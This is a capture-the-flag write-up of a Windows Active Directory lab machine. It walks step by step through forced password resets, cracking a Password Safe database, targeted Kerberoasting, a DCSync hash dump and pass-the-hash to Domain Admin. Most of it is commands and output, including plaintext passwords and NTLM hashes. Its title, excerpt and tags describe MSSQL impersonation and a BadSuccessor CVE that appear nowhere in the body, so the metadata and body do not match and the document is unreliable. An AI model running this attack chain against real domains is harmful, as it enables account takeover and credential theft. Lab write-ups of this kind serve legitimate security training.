---
title: "HTB-Eighteen-Easy"
date: "2025-11-21"
platform: "HackTheBox"
category: "Windows"
difficulty: "Easy"
tags: [
  "MSSQL",
  "Impersonation",
  "PBKDF2 Cracking",
  "Password Spraying",
  "WinRM",
  "Active Directory",
  "BadSuccessor",
  "Privilege Escalation",
  "Kerberos",
  "Ticket Forgery",
  "CVE-2025-21293",
  "Domain PrivEsc"
]
excerpt: "A full Active Directory compromise starting from MSSQL impersonation, cracking PBKDF2 hashes, password spraying to obtain WinRM access, and leveraging the BadSuccessor AD vulnerability (CVE-2025-21293) to escalate to Domain Admin."
readingTime: 20
featured: true
---

## Initial Reconnaissance

We start with credentials we've obtained:

```
Username: Olivia
Password: ichliebedich
```

### Port Scanning with Nmap

Our Nmap scan reveals a typical Active Directory environment:

```
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
```

**Key Observations:**

- Domain: `administrator.htb`
- DC hostname: `dc.administrator.htb`
- Kerberos, LDAP, and WinRM are all accessible
- FTP service running (interesting for later!)

---

## Enumeration with BloodHound

Time to map out the Active Directory environment! We'll use `bloodhound-python` to collect juicy domain data:

```bash
bloodhound-python -u 'olivia' -p 'ichliebedich' \
  -d 'administrator.htb' \
  -dc 'dc.administrator.htb' \
  -ns 10.10.11.42 \
  -c All --zip
```

![image](1.png)

Bingo! BloodHound reveals that **Olivia** has `ForceChangePassword` privileges over **Michael**, who in turn has the same privilege over **Benjamin**. This is our attack path! 🎯

---

## Privilege Escalation Chain

### Step 1: Forcing Password Changes

We'll use `bloodyAD` to abuse the `ForceChangePassword` permission and work our way down the chain.

**Reset Michael's password:**

```bash
bloodyAD --host '10.10.11.42' \
  -d 'administrator.htb' \
  -u 'olivia' \
  -p 'ichliebedich' \
  set password 'MICHAEL' 'Password#12'
```

```
[+] Password changed successfully!
```

![image](2.png)

**Reset Benjamin's password:**

```bash
bloodyAD --host '10.10.11.42' \
  -d 'administrator.htb' \
  -u 'michael' \
  -p 'Password#12' \
  set password 'benjamin' 'Password#12'
```

```
[+] Password changed successfully!
```

Perfect! Now we have access to Benjamin's account with the password `Password#12`.

---

## FTP Access & Password Safe Discovery

Remember that FTP service from our Nmap scan? Let's connect as Benjamin:

![image](3.png)

We discover a file named `Backup.psafe3`. Let's check what we're dealing with:

```bash
file Backup.psafe3
```

```
Backup.psafe3: Password Safe V3 database
```

A Password Safe database! This could contain credentials for multiple users. Time to crack it! 💪

---

## Cracking the Password Safe

### Extract the hash:

```bash
pwsafe2john Backup.psafe3 > psafe.hash
```

### Crack with John the Ripper:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt psafe.hash
```

**Password found:** `tekieromucho` 🎉

Opening the Password Safe reveals three user credentials:

```
alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur
```

---

## User Flag - Getting Shell as Emily

Let's connect via WinRM using Emily's credentials:

```bash
evil-winrm -i administrator.htb \
  -u emily \
  -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```

**User Flag:** `142aa43f************************` ✅

---

## Path to Domain Admin

Back to BloodHound! Analyzing Emily's permissions reveals something interesting:

![image](4.png)

Emily has an **outbound object control** relationship! This opens up two potential attack vectors:

1. **Shadow Credentials attack**
2. **Targeted Kerberoasting**

### Shadow Credentials - Failed Attempt

I initially tried the Shadow Credentials attack, but ran into an issue:

```
KDC has no support for PADATA type (pre-authentication data)
```

This fails because the DC doesn't support the required pre-authentication type. No worries—on to Plan B!

### Targeted Kerberoasting - Success! 🎯

This attack allows us to force a Service Principal Name (SPN) on a target account and then Kerberoast it:

```bash
/opt/ad-tools/targetedKerberoast-main/targetedKerberoast.py \
  -v \
  -d 'administrator.htb' \
  -u 'emily' \
  -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```

**We got a TGS hash for the user `ethan`!** 🔥

```
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$173c8f8d...
[VERBOSE] SPN removed successfully for (ethan)
```

---

## Cracking Ethan's Hash

Time to fire up Hashcat:

```bash
hashcat -m 13100 administrator.txt /usr/share/wordlists/rockyou.txt
```

**Password cracked:** `limpbizkit` 🎸

![image](5.png)

---

## DCSync Attack - Game Over

Checking Ethan's privileges in BloodHound reveals the golden ticket: **DCSync rights!**

The DCSync attack allows us to impersonate a Domain Controller and request password hashes for any account in the domain.

```bash
python3 /opt/ad-tools/secretsdump.py/secretsdump.py \
  ethan:limpbizkit@dc.administrator.htb
```

**Output - The Crown Jewels:**

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
[... more hashes ...]
```

We now have the **Administrator NTLM hash**: `3dc553ce4b9fd20bd016e098d2d2fd2e`

---

## Root Flag - Pass-the-Hash

No need to crack the Administrator password—we can use Pass-the-Hash with evil-winrm:

```bash
evil-winrm -i dc.administrator.htb \
  -u administrator \
  -H 3dc553ce4b9fd20bd016e098d2d2fd2e
```

**Root Flag:** `4cf2d737************************` 🏆